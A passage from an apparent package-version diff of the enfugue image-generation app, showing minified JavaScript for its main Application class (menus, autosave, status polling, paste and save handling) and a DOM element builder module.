saveBlobAs(t,e,i){i.startsWith(".")||(i=`.${i}`);let o=window.URL.createObjectURL(e),s=new FileNameFormView(this.config),n=await this.windows.spawnWindow(t,s,this.constructor.filenameFormInputWidth,this.constructor.filenameFormInputHeight);s.onCancel((()=>n.close())),s.onSubmit((t=>{let e=t.filename;e.endsWith(i)&&(e=e.substring(0,e.length-i.length));let s=document.createElement("a");s.setAttribute("download",`${e}${i}`),s.href=o,document.body.appendChild(s),window.requestAnimationFrame((()=>{s.dispatchEvent(createEvent("click")),document.body.removeChild(s),n.remove()}))})),n.onClose((()=>window.URL.revokeObjectURL(o)))}async onPaste(t){let e=(t.clipboardData||t.originalEvent.clipboardData).items;for(let t of e)if("file"===t.kind){let e=t.getAsFile(),i=new FileReader;i.onload=t=>this.images.addImageNode(t.target.result,"Pasted Image"),i.readAsDataURL(e)}else t.getAsString((t=>this.onTextPaste(t)))}async onImagePaste(t){let e=new ImageView(this.config,t);await e.waitForLoad(),this.images.addNode(ImageEditorImageNodeView,"Pasted Image",e,0,0,e.width,e.height)}async onTextPaste(t){t.startsWith("<html>")||console.warn("Text paste",t)}getStatefulControllers(){let t=[this.modelPicker].concat(this.toolbarControllers).concat(this.sidebarControllers);for(let e in this.menuControllers)t=t.concat(this.menuControllers[e]);return t}getState(){let t={images:this.images.getState()},e=this.getStatefulControllers();for(let i of e)t={...t,...i.getState()};return t}shouldSaveState(){let t=this.getState();return!(isEmpty(t.prompts)||isEmpty(t.prompts.prompt)&&isEmpty(t.prompts.negativePrompt))||!isEmpty(t.images)}async setState(t,e=!1){!0===e&&this.shouldSaveState()&&(await this.autosave(!1),await this.history.flush(t));let i=this.getStatefulControllers();for(let e of i)await e.setState(t);isEmpty(t.canvas)||(isEmpty(t.canvas.width)||(this.images.width=t.canvas.width),isEmpty(t.canvas.height)||(this.images.height=t.canvas.height)),void 0!==t.images&&null!==t.images&&(this.engine.hideSampleChooser(),this.images.hideCurrentInvocation(),this.images.setState(t.images))}async resetState(t=!0){let e={images:[]},i=this.getStatefulControllers();for(let t of i)e={...e,...t.getDefaultState()};await this.setState(e,t)}async initializeStateFromImage(t,e=!0){try{let i={},o=await this.yesNo("Would you like to keep settings?<br /><br />This will maintain things like prompts and other global settings the same while only changing the dimensions to match the image."),s=this.getStatefulControllers();for(let t of s)i=o?{...i,...t.getState()}:{...i,...t.getDefaultState()};isEmpty(i.canvas)&&(i.canvas={}),i.canvas.width=t.width,i.canvas.height=t.height,i.images=[ImageEditorView.getNodeDataForImage(t)],this.engine.hideSampleChooser(),this.images.hideCurrentInvocation(),this.images.width=t.width,this.images.height=t.height,await this.setState(i,e)}catch(t){}}onKeyPress(t){}async popState(t){}}export{Application};
+import{isEmpty,getQueryParameters,getDataParameters,waitFor,createEvent}from"../base/helpers.mjs";import{Session}from"../base/session.mjs";import{Publisher}from"../base/publisher.mjs";import{TooltipHelper}from"../common/tooltip.mjs";import{MenuView,SidebarView,ToolbarView}from"../view/menu.mjs";import{StatusView}from"../view/status.mjs";import{NotificationCenterView}from"../view/notifications.mjs";import{WindowsView}from"../view/nodes/windows.mjs";import{ImageEditorView,ImageEditorNodeView,ImageEditorImageNodeView}from"../view/nodes/image-editor.mjs";import{ImageView}from"../view/image.mjs";import{Model}from"../model/enfugue.mjs";import{ConfirmFormView,YesNoFormView}from"../view/forms/confirm.mjs";import{View}from"../view/base.mjs";import{FormView}from"../view/forms/base.mjs";import{StringInputView}from"../view/forms/input.mjs";import{InvocationController}from"../controller/common/invocation.mjs";import{ModelPickerController}from"../controller/common/model-picker.mjs";import{ModelManagerController}from"../controller/common/model-manager.mjs";import{DownloadsController}from"../controller/common/downloads.mjs";import{AnimationsController}from"../controller/common/animations.mjs";import{LogsController}from"../controller/common/logs.mjs";import{AnnouncementsController}from"../controller/common/announcements.mjs";import{HistoryDatabase}from"../common/history.mjs";import{SimpleNotification}from"../common/notify.mjs";class FileNameFormView extends FormView{static fieldSets={"File Name":{filename:{class:StringInputView,config:{required:!0,placeholder:"Please enter a filename."}}}}}class LogoutButtonView extends View{static tagName="i";static className="fa-solid fa-right-from-bracket logout";async logout(){window.location="/logout"}async build(){let t=await super.build();return t.on("click",(()=>this.logout())),t.data("tooltip","Logout"),t}}class Application{static menuCategories={file:"File"};static adminMenuCategories={models:"Models",system:"System"};static filenameFormInputWidth=400;static filenameFormInputHeight=250;static logoShadowRGB=[0,0,0];static logoShadowOpacity=.5;static logoShadowSteps=10;static logoShadowOffset=2;static logoShadowSpread=0;static confirmViewWidth=500;static confirmViewHeight=200;constructor(t){this.config=t,this.publisher=new Publisher}async initialize(){this.tooltips=new TooltipHelper,this.container=document.querySelector(this.config.view.applicationContainer),isEmpty(this.container)?console.error(`Couldn't find application configuration using selector ${this.config.view.applicationContainer}, abandoning initialization.`):(this.session=Session.getScope("enfugue"),this.model=new Model(this.config),this.menu=new MenuView(this.config),this.sidebar=new SidebarView(this.config),this.toolbar=new ToolbarView(this.config),this.windows=new WindowsView(this.config),this.notifications=new NotificationCenterView(this.config),this.history=new HistoryDatabase(this.config.history.size,this.config.debug),this.images=new ImageEditorView(this),this.container.appendChild(await this.menu.render()),this.container.appendChild(await this.sidebar.render()),this.container.appendChild(await this.toolbar.render()),this.container.appendChild(await this.images.render()),this.container.appendChild(await this.windows.render()),this.container.appendChild(await this.notifications.render()),await this.startAnimations(),await this.registerDownloadsControllers(),await this.registerAnimationsControllers(),await this.registerModelControllers(),await this.registerInvocationControllers(),await this.registerMenuControllers(),await this.registerSidebarControllers(),await this.registerToolbarControllers(),await this.startAutosave(),await this.startAnnouncements(),await this.startLogs(),await this.registerLogout(),await this.startKeepalive(),window.onpopstate=t=>this.popState(t),document.addEventListener("paste",(t=>this.onPaste(t))),document.addEventListener("keypress",(t=>this.onKeyPress(t))))}async startLogs(){this.logs=new LogsController(this),await this.logs.initialize()}async startAnnouncements(){this.announcements=new AnnouncementsController(this),await this.announcements.initialize()}async startAnimations(){let t=document.querySelector("header h1");isEmpty(t)?console.warn("Can't find header logo, not binding animations."):(this.animations=!0,window.addEventListener("mousemove",(e=>{if(!1===this.animations)return;let[i,o]=[e.clientX/window.innerWidth,e.clientY/window.innerHeight],s=[];for(let t=0;t<this.constructor.logoShadowSteps;t++){let[e,n]=[i*(t+1)*this.constructor.logoShadowOffset,o*(t+1)*this.constructor.logoShadowOffset],a=this.constructor.logoShadowOpacity-t/this.constructor.logoShadowSteps*this.constructor.logoShadowOpacity,r=`rgba(${this.constructor.logoShadowRGB.concat(a.toFixed(2)).join(",")})`;s.push(`${e}px ${n}px ${this.constructor.logoShadowSpread}px ${r}`)}t.style.textShadow=s.join(",")})))}async enableAnimations(){this.animations||(this.animations=!0,this.session.setItem("animations",!0),document.body.classList.remove("no-animations"),this.publish("animationsEnabled"))}async disableAnimations(){this.animations&&(this.animations=!1,this.session.setItem("animations",!1),document.body.classList.add("no-animations"),this.publish("animationsDisabled"))}async registerModelControllers(){this.modelManager=new ModelManagerController(this),await this.modelManager.initialize(),this.modelPicker=new ModelPickerController(this),await this.modelPicker.initialize()}async registerDownloadsControllers(){this.downloads=new DownloadsController(this),await this.downloads.initialize()}async registerInvocationControllers(){this.engine=new InvocationController(this),await this.engine.initialize()}async registerAnimationsControllers(){this.animation=new AnimationsController(this),await this.animation.initialize()}getMenuCategories(){let t={...this.constructor.menuCategories};return isEmpty(window.enfugue)||!0!==window.enfugue.admin||(t={...t,...this.constructor.adminMenuCategories}),t.help="Help",t}async registerMenuControllers(){let t=this.getMenuCategories();this.menuControllers={};for(let e in t){let i=t[e];this.menuControllers[e]=[];try{let t=await import(`../controller/${e}/index.autogenerated.mjs`),o=await this.menu.addCategory(i);for(let i of t.Index)try{let t=(await import(`../controller/${e}/${i}`)).MenuController;if(isEmpty(t))throw"Module does not provide a 'MenuController' export.";if(!t.isDisabled()){let i=await o.addItem(t.menuName,t.menuIcon),s=new t(this);await s.initialize(),i.onClick((()=>s.onClick())),this.menuControllers[e].push(s)}}catch(t){console.warn("Couldn't import",e,"menu controller",i,t)}}catch(t){console.warn("Couldn't register controllers for menu",e,t)}}}async registerSidebarControllers(){let t=await import("../controller/sidebar/index.autogenerated.mjs");this.sidebarControllers=[];for(let e of t.Index){let t=(await import(`../controller/sidebar/${e}`)).SidebarController;if(isEmpty(t))throw"Module does not provide a 'SidebarController' export.";let i=new t(this);await i.initialize(),this.sidebarControllers.push(i)}}async registerToolbarControllers(){let t=await import("../controller/toolbar/index.autogenerated.mjs");this.toolbarControllers=[];for(let e of t.Index){let t=(await import(`../controller/toolbar/${e}`)).ToolbarController;if(isEmpty(t))throw"Module does not provide a 'ToolbarController' export.";let i=await this.toolbar.addItem(t.menuName,t.menuIcon),o=new t(this);await o.initialize(),i.onClick((()=>o.onClick())),this.toolbarControllers.push(o)}}async startKeepalive(){const t=this.config.model.status.interval||1e4,e=t=>{"ready"===t?this.publish("engineReady"):"busy"===t?this.publish("engineBusy"):"idle"===t?this.publish("engineIdle"):console.warn("Unknown status",t)};let i=document.querySelector("header");if(isEmpty(i))return void console.warn("No header found on page, not appending status view.");let o=await this.model.get(),s=new StatusView(this.config,o),n=await s.getNode();e(o.status),i.appendChild(n.render()),setInterval((async()=>{try{let t=await this.model.get();o.status!==t.status&&e(t.status),s.updateStatus(t),o=t}catch{s.updateStatus("error")}}),t);let a=await this.model.get("/invocation"),r=null;for(let t of a)if("processing"===t.status){r=t;break}isEmpty(r)||(isEmpty(r)||isEmpty(r.metadata)||isEmpty(r.metadata.tensorrt_build)?(this.notifications.push("info","Active Invocation Found","You have an image currently being generated, beginning monitoring process."),this.engine.canvasInvocation(r.uuid)):this.notifications.push("info","TensorRT Build in Progress",`You have a TensorRT engine build in progress for ${r.metadata.tensorrt_build.model}. You'll receive a notification in this window when it is complete. The engine will remain unavailable until that time.`),this.publish("invocationBegin",r)),setInterval((async()=>{try{let t,e=await this.model.get("/invocation");for(let i of e)"processing"===i.status&&(null!==r&&r.id===i.id||(t=i)),isEmpty(r)||i.id!==r.id||i.status===r.status||("completed"===i.status?this.publish("invocationComplete",i):this.publish("invocationError",i),r=null);isEmpty(t)||(this.publish("invocationBegin",t),r=t)}catch(t){console.error(t)}}),t)}async registerLogout(){if(!isEmpty(window.enfugue.user)&&"noauth"!==window.enfugue.user){let t=new LogoutButtonView(this.config);document.querySelector("header").appendChild((await t.getNode()).render())}}async startAutosave(){try{let t=await this.history.getCurrentState();isEmpty(t)||(this.setState(t),this.notifications.push("info","Session Restored","Your last autosaved session was successfully loaded."));const e=this.config.model.autosave.interval||3e4;setInterval((()=>this.autosave()),e)}catch(t){console.error(t),this.notifications.push("warning","History Disabled","Couldn't open IndexedDB, history and autosave are disabled.")}}async autosave(t=!0){try{await this.history.setCurrentState(this.getState()),t&&SimpleNotification.notify("Session autosaved!",2e3)}catch(t){console.error("Couldn't autosave",t)}}subscribe(t,e){this.publisher.subscribe(t,e)}unsubscribe(t,e){this.publisher.unsubscribe(t,e)}async publish(t,e=null){this.publisher.publish(t,e)}spawnConfirmForm(t,e,i,o=!0,s=!1){return new Promise((async(n,a)=>{let r,l=!1,m=new t(this.config,i);m.onSubmit((()=>{l=!0,n(!0),o&&r.remove()})),m.onCancel((()=>{l=!0,n(!1),r.remove()})),r=await this.windows.spawnWindow(e,m,this.constructor.confirmViewWidth,this.constructor.confirmViewHeight),r.onClose((()=>{!l&&s?a():n(!1),l=!0}))}))}confirm(t,e=!0){return this.spawnConfirmForm(ConfirmFormView,"Confirm",t,e)}yesNo(t,e=!0){return this.spawnConfirmForm(YesNoFormView,"Yes or No",t,e,!0)}async saveAs(t,e,i,o){let s=new Blob([e],{type:i});return this.saveBlobAs(t,s,o)}async saveBlobAs(t,e,i){i.startsWith(".")||(i=`.${i}`);let o=window.URL.createObjectURL(e),s=new FileNameFormView(this.config),n=await this.windows.spawnWindow(t,s,this.constructor.filenameFormInputWidth,this.constructor.filenameFormInputHeight);s.onCancel((()=>n.close())),s.onSubmit((t=>{let e=t.filename;e.endsWith(i)&&(e=e.substring(0,e.length-i.length));let s=document.createElement("a");s.setAttribute("download",`${e}${i}`),s.href=o,document.body.appendChild(s),window.requestAnimationFrame((()=>{s.dispatchEvent(createEvent("click")),document.body.removeChild(s),n.remove()}))})),n.onClose((()=>window.URL.revokeObjectURL(o)))}async onPaste(t){let e=(t.clipboardData||t.originalEvent.clipboardData).items;for(let t of e)if("file"===t.kind){let e=t.getAsFile(),i=new FileReader;i.onload=t=>this.images.addImageNode(t.target.result,"Pasted Image"),i.readAsDataURL(e)}else t.getAsString((t=>this.onTextPaste(t)))}async onImagePaste(t){let e=new ImageView(this.config,t);await e.waitForLoad(),this.images.addNode(ImageEditorImageNodeView,"Pasted Image",e,0,0,e.width,e.height)}async onTextPaste(t){t.startsWith("<html>")||console.warn("Text paste",t)}getStatefulControllers(){let t=[this.modelPicker].concat(this.toolbarControllers).concat(this.sidebarControllers);for(let e in this.menuControllers)t=t.concat(this.menuControllers[e]);return t}getState(){let t={images:this.images.getState()},e=this.getStatefulControllers();for(let i of e)t={...t,...i.getState()};return t}shouldSaveState(){let t=this.getState();return!(isEmpty(t.prompts)||isEmpty(t.prompts.prompt)&&isEmpty(t.prompts.negativePrompt))||!isEmpty(t.images)}async setState(t,e=!1){!0===e&&this.shouldSaveState()&&(await this.autosave(!1),await this.history.flush(t));let i=this.getStatefulControllers();for(let e of i)await e.setState(t);isEmpty(t.canvas)||(isEmpty(t.canvas.width)||(this.images.width=t.canvas.width),isEmpty(t.canvas.height)||(this.images.height=t.canvas.height)),void 0!==t.images&&null!==t.images&&(this.engine.hideSampleChooser(),this.images.hideCurrentInvocation(),this.images.setState(t.images))}async resetState(t=!0){let e={images:[]},i=this.getStatefulControllers();for(let t of i)e={...e,...t.getDefaultState()};await this.setState(e,t)}async initializeStateFromImage(t,e=!0){try{let i={},o=await this.yesNo("Would you like to keep settings?<br /><br />This will maintain things like prompts and other global settings the same while only changing the dimensions to match the image."),s=this.getStatefulControllers();for(let t of s)i=o?{...i,...t.getState()}:{...i,...t.getDefaultState()};isEmpty(i.canvas)&&(i.canvas={}),i.canvas.width=t.width,i.canvas.height=t.height,i.images=[ImageEditorView.getNodeDataForImage(t)],this.engine.hideSampleChooser(),this.images.hideCurrentInvocation(),this.images.width=t.width,this.images.height=t.height,await this.setState(i,e)}catch(t){}}onKeyPress(t){}async popState(t){}}export{Application};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/base/api.mjs` & `enfugue-0.2.0/enfugue/static/js/base/api.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/base/builder.mjs` & `enfugue-0.2.0/enfugue/static/js/base/builder.mjs`

 * *Files 0% similar despite different names*

```diff
@@ -1 +1 @@
-import{uuid,createEvent,isEmpty,parseSelector}from"./helpers.mjs";let defaultTags=["div","span","input","br","hr","a","p","i","strong","em","button","input","select","option","img","h1","h2","h3","h4","ul","ol","li","table","tbody","thead","tr","td","th","canvas","label","iframe","form","textarea","pre","fieldset","legend","code","style","link","script"],namespacedTags={"http://www.w3.org/2000/svg":["svg","path","rect","circle"]},defaultAttributes=["id","type","src","action","target","placeholder","href","disabled","selected","alt","value","width","height","x","y","d","cx","cy","r","for","name","fill","stroke","rel"],namespacedAttributes={"http://www.w3.org/2000/xlink":["xref"]};class FrameStacker{constructor(){this.callbacks=[],this.next=[],this.waiting=!1}requestFrame(e){this.callbacks.push(e),this.waiting||(window.requestAnimationFrame((()=>this.fireCallbacks())),this.waiting=!0)}requestNextFrame(e){this.next.push(e)}fireNextCallbacks(){for(let e of this.next)e();this.next=[]}fireCallbacks(){for(let e of this.callbacks)e();window.requestAnimationFrame((()=>this.fireNextCallbacks())),this.callbacks=[],this.waiting=!1}}const globalFrame=new FrameStacker;class DOMElement{static assignDefaultAttributes=!0;static assignNamespacedAttributes=!0;static assignElementId=!0;constructor(e,t){this.nameSpace=t,this.elementId=uuid(),this.tagName=e,this.attributes={},this.namespacedAttributes={},this.contentArray=[],this.elementClasses=[],this.events={},this.styles={};let n=0,i=this;if(this.constructor.assignDefaultAttributes)for(n=0;n<defaultAttributes.length;n++)this[defaultAttributes[n]]=function(e){return function(t){return i.attr(e,t)}}(defaultAttributes[n]);if(this.constructor.assignNamespacedAttributes)for(let e in namespacedAttributes)for(n=0;n<namespacedAttributes[e].length;n++)this[namespacedAttributes[e][n]]=function(t){return function(n){return i.attr(t,n,e)}}(namespacedAttributes[e][n]);"svg"===e&&(this.attributes.xmlns="http://www.w3.org/2000/svg",this.attributes.version="1.1",this.attributes["xmlns:xlink"]="http://www.w3.org/1999/xlink"),this.constructor.assignElementId&&this.data({"element-id":this.elementId})}static fromNode(e){let t=new DOMElement(e.tagName.toLowerCase()),n=Array.from(e.children);for(let n of e.getAttributeNames())-1!=["style"].indexOf(n)&&t.attr(n,e.getAttribute(n));for(let n of e.classList)t.addClass(n);if(n.length>0)t.contentArray=n.map((e=>DOMElement.fromNode(e)));else{let n=e.innerText;n.length>0&&t.content(n)}return t.element=e,t}editable(){return this.attr("contenteditable","true").attr("tabindex",0).on("input",(e=>{this.contentArray[0]=this.element.innerText}))}empty(){return this.contentArray=[],void 0!==this.element&&this.setDOMContent(this.contentArray),this}matchesSelector(e){if(void 0!==this.element)return this.element.matches(e);{let t=parseSelector(e);if(!isEmpty(t.tags)&&-1===t.tags.indexOf(this.tagName))return!1;if(!isEmpty(t.ids)&&-1===t.ids.indexOf(this.attr("id")))return!1;if(!isEmpty(t.classes))for(let e of t.classes)if(-1==this.elementClasses.indexOf(e))return!1;if(!isEmpty(t.attributes))for(let e in t.attributes)if(this.attr(e)!==t.attributes[e])return!1;return!0}}css(e,t){if(void 0===t){if("object"==typeof e){for(let t in e)this.css(t,e[t]);return this}return this.styles[e]}null===t?delete this.styles[e]:("number"==typeof t&&-1!==["left","right","top","bottom","width","height"].indexOf(e)&&(t+="px"),this.styles[e]=t);let n=this;return this.attr("style",Object.getOwnPropertyNames(this.styles).map((e=>`${e}: ${n.styles[e]}`)).join("; ")),this}show(){return void 0===this.display?this.css("display",null):this.css("display",this.display),this}hide(){return void 0===this.display&&"none"!==this.styles.display&&(this.display=this.styles.display),this.css("display","none"),this}attr(e,t,n){return void 0===t?void 0===n?this.attributes[e]:this.namespacedAttributes.hasOwnProperty(n)?this.namespacedAttributes[n][e]:void 0:(null===t||!1===t?void 0===n?this.attributes.hasOwnProperty(e)&&(delete this.attributes[e],void 0!==this.element&&this.removeDOMAttribute(e,t)):this.attributes.hasOwnProperty(n)&&(delete this.namespacedAttributes[namespace][e],void 0!==this.element&&this.removeDOMAttributeNS(e,t,n)):(!0===t&&(t=e),void 0===n?(this.attributes[e]=t,void 0!==this.element&&this.setDOMAttribute(e,t)):(this.namespacedAttributes.hasOwnProperty(n)||(this.namespacedAttributes[n]={}),this.namespacedAttributes[n][e]=t,void 0!==this.element&&this.setDOMAttributeNS(e,t,n))),this)}hasClass(e){return-1!==this.elementClasses.indexOf(e)}class(e){for(let e of this.elementClasses)this.removeClass(e);return this.addClass(e)}addClass(e){for(let t of e.split(" "))this.elementClasses.push(t),void 0!==this.element&&this.element.classList.add(t);return this}removeClass(e){return this.elementClasses=this.elementClasses.filter((t=>t!==e)),void 0!==this.element&&this.element.classList.remove(e),this}toggleClass(e){return this.hasClass(e)?this.removeClass(e):this.addClass(e),this}data(e,t){if(void 0===e)return this.attributes.filter((e=>e.key.startsWith("data")));if("string"==typeof e){if(void 0===t)return this.attr("data-"+e);this.attr("data-"+e,t)}else{let t;for(t in e)this.attr("data-"+t,e[t])}return this}content(){return this.empty(),this.contentArray=Array.from(arguments),void 0===this.contentArray[0]&&(this.contentArray=[]),void 0!==this.element&&this.setDOMContent(this.contentArray),this}prepend(){return this.contentArray=Array.from(arguments).concat(this.contentArray),void 0!==this.element&&this.setDOMContent(this.contentArray),this}append(){return this.contentArray=this.contentArray.concat(Array.from(arguments)),void 0!==this.element&&this.appendDOMContent(this.contentArray[this.contentArray.length-1]),this}extend(e){let t=e.length;if(this.contentArray=this.contentArray.concat(e),void 0!==this.element)for(let e=this.contentArray.length-t;e<this.contentArray.length;e++)this.appendDOMContent(this.contentArray[e]);return this}insert(e,t){return this.contentArray=this.contentArray.slice(0,e).concat([t]).concat(this.contentArray.slice(e)),void 0!==this.element&&this.setDOMContent(this.contentArray),this}insertAfter(e,t){let n=this.getChildIndex(e);return this.insert(n+1,t)}insertBefore(e,t){let n=this.getChildIndex(e);return this.insert(n,t)}swapChildren(e,t){let n=this.contentArray[t];return this.contentArray[t]=this.contentArray[e],this.contentArray[e]=n,this}getChildIndex(e){let t,n,i;if(t=e instanceof DOMElement?e.elementId:e.getAttribute("data-element-id"),void 0!==t)for(let e=0;e<this.contentArray.length;e++){if(this.contentArray[e]instanceof DOMElement)n=this.contentArray[e].elementId;else{if(!(this.contentArray[e]instanceof Node))continue;n=this.contentArray[e].getAttribute("data-element-id")}if(void 0!==n&&n===t){i=e;break}}return i}getChildIndexById(e){let t;for(let n=0;n<this.contentArray.length;n++)if(t=this.contentArray[n]instanceof DOMElement?this.contentArray[n].elementId:this.contentArray[n].getAttribute("data-element-id"),t===e)return n;return null}is(e){let t;return e instanceof DOMElement?t=e.elementId:e instanceof Node&&(t=e.getAttribute("data-element-id")),t===this.elementId}remove(e){if(void 0===e)return void 0!==this.element&&(this.element.remove(),this.element=void 0),this;{let t=this.getChildIndex(e);if(void 0!==t){let e=this.contentArray[t];return this.contentArray=this.contentArray.slice(0,t).concat(this.contentArray.slice(t+1)),void 0!==this.element&&this.removeDOMContent(e),this}}return console.error("Couldn't find child element",e),this}replace(e,t){let n=this.getChildIndex(e),i=this.element;if(void 0!==n)this.contentArray=this.contentArray.slice(0,n).concat([t]).concat(this.contentArray.slice(n+1)),void 0!==i&&window.requestAnimationFrame((function(){i.childNodes[n].replaceWith(t.render())}));else if(this.contentArray.length>0)for(let n of this.contentArray)n.replace(e,t);return this}isEmpty(){return 0==this.contentArray.length}children(){return this.contentArray}getChild(e){return this.contentArray[e]}getText(){return this.children().map((e=>"string"==typeof e?e:e instanceof DOMElement?e.getText():"")).join("")}firstChild(){return this.contentArray[0]}lastChild(){return this.contentArray[this.contentArray.length-1]}on(e,t){for(let n of e.split(","))void 0!==this.element&&this.setDOMEvent(n,t),this.events.hasOwnProperty(n)?this.events[n].push(t):this.events[n]=[t];return this}off(e,t){for(let n of e.split(",")){if(void 0!==this.element&&void 0!==this.events[n]){if(void 0!==t)return this.removeDOMEvent(n,t),this.events[n]=this.events[n].filter((e=>e!==t)),this;for(let e of this.events[n])this.removeDOMEvent(n,e)}delete this.events[n]}return this}val(e,t){if(void 0===e){if(void 0===this.element)return;return this.element.value}if("select"==this.tagName)for(let t of this.contentArray)t.value()===e?t.selected(!0):t.selected(!1);else if("textarea"===this.tagName)void 0!==this.element?this.element.innerText=e:this.on("render",(()=>{this.val(e).off("render")}));else if("input"===this.tagName&&"checkbox"===this.attr("type"))this.attr("checked",e),void 0!==this.element&&(this.element.checked=e);return void 0!==this.element&&(this.element.value=e),this.value(e),!1!==t&&this.trigger("change"),this}focus(){return this.element.focus(),this}select(){return this.element.select(),this}trigger(e){return void 0!==this.element&&("string"==typeof e&&(e=createEvent(e)),this.element.dispatchEvent(e)),this}removeDOMAttribute(e){if(void 0===this.element)throw"Element has not been rendered, cannot remove attributes.";return this.element.removeAttribute(e),this}removeDOMAttributeNS(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot remove attributes.";return this.element.removeAttributeNS(t,e),this}setDOMAttribute(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.setAttribute(e,t),this}setDOMAttributeNS(e,t,n){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.setAttributeNS(n,e,t),this}addDOMClass(e){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.classList.add(e),this}setDOMEvent(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set event listeners.";return this.element.addEventListener(e,t),this}removeDOMEvent(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set event listeners.";void 0!==t&&this.element.removeEventListener(e,t)}appendDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot append content.";if(e instanceof DOMElement){if(void 0===e.element&&e.render(this.element),e.element instanceof DocumentFragment)return this;this.element.appendChild(e.element)}else try{if(e instanceof DocumentFragment)return this;this.element.appendChild(e)}catch(t){if(null==e)throw"Cannot add null or undefined content to "+this.tagName;console.error("Could not add content of type",e.constructor.name,e,"to",this),console.error(t)}return this}removeDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot remove content.";if(e instanceof DOMElement){if(void 0===e.element)return this;if(e.element instanceof DocumentFragment)throw"Shadow elements cannot be detached; you must remove the parent element.";this.element.removeChild(e.element)}else this.element.removeChild(e);return this}setDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot set content.";let t=this;return globalFrame.requestFrame((function(){if(void 0!==t.element){for(;t.element.firstChild;)t.element.removeChild(t.element.firstChild);if(Array.isArray(e)||(e=[e]),1==e.length&&"string"==typeof e[0])return"CODE"===t.element.tagName||"PRE"===t.element.tagName?t.element.innerText=e[0]:t.element.innerHTML=e[0],t.element;if(e.length>=1){let n=0;for(n=0;n<e.length;n++)if(e[n]instanceof DOMElement){if(void 0===e[n].element&&e[n].render(t.element),e[n].element instanceof DocumentFragment)continue;t.element.appendChild(e[n].element)}else try{if(e[n]instanceof DocumentFragment)continue;t.element.appendChild(e[n])}catch(i){if(null===e[n]||void 0===e[n])throw console.error("Could not add null or undefined content to",t),console.trace(i),"Cannot add null or undefined content to "+t.tagName;console.error("Could not add content of type",e[n].constructor.name,e[n],"to",t),console.error(i),console.trace(i)}}}})),this}createDOMElement(){return document.createElement(this.tagName)}render(){let e,t,n,i,s=void 0===this.element,r=[].concat(this.contentArray);void 0===this.element&&(this.element=this.createDOMElement());for(let e in r)r[e]instanceof DOMElement&&(r[e]=r[e].render(this.element));for(e in this.attributes)this.setDOMAttribute(e,this.attributes[e]);for(t of this.elementClasses)this.addDOMClass(t);for(n in this.events)for(i of this.events[n])this.setDOMEvent(n,i);return this.setDOMContent(r),s&&this.trigger("render"),"select"===this.tagName&&void 0!==this.element&&globalFrame.requestNextFrame((()=>{if(isEmpty(this.attributes.value))this.element.childNodes[0].selected=!0;else for(let e of this.element.childNodes)if(e.value==this.attributes.value)return void(e.selected=!0)})),this.element}async awaitRender(){if(void 0===this.element){let e=this;return this.render(),new Promise((function(t,n){e.on("ready",(()=>t(e.element)))}))}return Promise.resolve(this.element)}redraw(){this.element.innerHTML=this.element.innerHTML}findDeep(e){for(let t of this.children()){if(t instanceof DOMElement&&t.matchesSelector(e))return t;let n=t.findDeep(e);if(null!=n)return n}return null}findWide(e){for(let t of this.children())if(t instanceof DOMElement&&t.matchesSelector(e))return t;for(let t of this.children())if(t instanceof DOMElement){let n=t.findWide(e);if(null!=n)return n}return null}findAllDeep(e){let t=[];for(let n of this.children())n instanceof DOMElement&&(n.matchesSelector(e)&&t.push(n),t=t.concat(n.findAllDeep(e)));return t}findAllWide(e){let t=[];for(let n of this.children())n instanceof DOMElement&&n.matchesSelector(e)&&t.push(n);for(let n of this.children())n instanceof DOMElement&&(t=t.concat(n.findAllDeep(e)));return t}find(e){return this.findWide(e)}findAll(e){return this.findAllWide(e)}scrollToBottom(){return void 0!==this.element&&this.element.scrollTo(0,this.element.scrollHeight),this}}class DOMElementList{static fromNodeList(e){return new DOMElementList(Array.from(e).map((e=>{if(e instanceof Node)return DOMElement.fromNode(e);if(e instanceof DOMElement)return e;throw console.error("Cannot parse element",e),new Error("Invalid argument.")})))}constructor(e){this.elements=e}each(e){for(let t of this.children())e.apply(t)}children(){return this.elements}}class ShadowDOMElement extends DOMElement{static assignElementId=!1;createDOMElement(){if(isEmpty(this.parentElement))throw"Shadow DOMs must be attached to an element, they cannot be instantiated on their own.";try{return this.parentElement.attachShadow({mode:"open"})}catch(e){if(this.parentElement.shadowRoot)return this.parentElement.shadowRoot;throw e}}setDOMAttribute(e,t){return console.warn("DOM attributes not supported on shadow elements, ignoring setting",e,"=",t),this}setDOMAttributeNS(e,t,n){return console.warn("DOM attributes not supported on shadow elements, ignoring setting",`${n}:${e}`,"=",t),this}setDOMEvent(e,t){return console.warn("DOM events not supported on shadow elements, ignoring adding listener for",e),this}removeDOMEvent(e,t){return console.warn("DOM events not supported on shadow elements, ignoring removing listener for",e),this}removeDOMAttribute(e){return console.warn("DOM attributes not supported on shadow elements, ignoring removing",e),this}removeDOMAttributeNS(e,t){return console.warn("DOM attributes not supported on shadow elements, ignoring removing",`${t}:${e}`),this}addDOMClass(e){return console.warn("DOM classes not supported on shadow elements, ignoring adding",e),this}render(e){return this.parentElement=e,super.render()}}let Builder=function(e){let t,n,i=function(e){if(e instanceof DOMElement||e instanceof DOMElementList)return e;if(Array.isArray(e)||e instanceof HTMLCollection||e instanceof NodeList)return DOMElementList.fromNodeList(e);if(e instanceof Node)return DOMElement.fromNode(node);if("string"==typeof e){let t=document.querySelectorAll(e);return 1===t.length?DOMElement.fromNode(t[0]):DOMElementList.fromNodeList(t)}return this};i.createElement=function(e,t){return new DOMElement(e,t)},i.createShadow=function(){return new ShadowDOMElement};for(let t in e)i[t]=()=>i.createElement(e[t]);for(i.getCustomTag=t=>isEmpty(e)?void 0:e[t],t=0;t<defaultTags.length;t++)i[defaultTags[t]]=function(e){return function(){return i.createElement(e)}}(defaultTags[t]);for(n in namespacedTags)for(t=0;t<namespacedTags[n].length;t++)i[namespacedTags[n][t]]=function(e,t){return function(){return i.createElement(e,t)}}(namespacedTags[n][t],n);return i};export{Builder as ElementBuilder,DOMElement};
